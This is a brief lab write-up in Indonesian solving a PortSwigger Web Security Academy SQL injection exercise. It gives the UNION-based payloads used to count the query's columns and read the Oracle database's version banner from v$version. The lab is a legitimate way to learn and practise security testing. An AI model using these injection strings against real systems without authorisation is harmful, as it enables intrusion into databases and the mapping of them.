# SQL injection attack, querying the database type and version on Oracle

Link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

### Jawaban
1. Melakukan `ORDER BY` untuk menemukan berapa jumlah column untuk request filter category dan ditemukan saat `'ORDER BY 3--` terjadi error maka columnnya berjumlah 2
<img width="2495" height="1348" alt="image" src="https://github.com/user-attachments/assets/f11401e4-9c37-47db-bbcf-d3b1cf52c8c6" />

<img width="2552" height="601" alt="image" src="https://github.com/user-attachments/assets/e7d1edba-b19e-44cd-9db6-316fb9693ed6" />

2. Coba mengambil dari tabel bawaan oracle yaitu `dual` dengan `UNION+SELECT+%27a%27,+%27b%27+FROM+DUAL--`
<img width="2005" height="1317" alt="image" src="https://github.com/user-attachments/assets/e09914d3-02b8-477d-9f96-9f704123bc15" />

3. Mengambil data version dari oracle dengan `UNION+SELECT+banner,+NULL+FROM+v$version--`
<img width="1333" height="597" alt="image" src="https://github.com/user-attachments/assets/4b0de2ae-044d-423d-a62b-c3ebb228692e" />

<img width="2542" height="1416" alt="image" src="https://github.com/user-attachments/assets/04ca0357-51fa-49f0-85dd-a04062344a81" />
